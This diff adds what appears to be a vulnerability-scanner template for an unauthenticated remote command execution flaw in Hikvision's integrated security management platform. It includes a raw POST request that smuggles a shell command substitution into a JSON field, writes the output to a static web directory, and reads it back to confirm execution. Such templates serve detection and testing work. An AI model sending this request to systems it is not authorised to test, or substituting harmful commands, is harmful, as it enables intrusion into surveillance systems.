@@ -1,0 +1,32 @@
+id: hikvision-detection-rce
+
+info:
+  name: 海康威视综合安防管理平台 installation/detection 远程命令执行
+  author: k5rC85Lma
+  severity: high
+  description: |
+    海康威视综合安防管理平台 /center/api/installation/detection 接口可将命令输出写入静态目录，未鉴权即可验证命令执行。
+    仅保留本地 HTTP 回读校验，未转换 OOB 探测分支。
+  reference:
+    - https://github.com/zan8in/afrog
+  tags: hikvision,isecure,rce
+
+variables:
+  randstr: "{{rand_base(6)}}"
+
+http:
+  - raw:
+      - |
+        POST /center/api/installation/detection HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"type":"environment","operate":"","machines":{"id":  "$(id > /opt/hikvision/web/components/tomcat85linux64.1/webapps/vms/static/{{randstr}}.txt)"}}
+      - |
+        GET /vms/static/{{randstr}}.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_1 == 200 && status_code_2 == 200 && regex("((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)", body_2)'
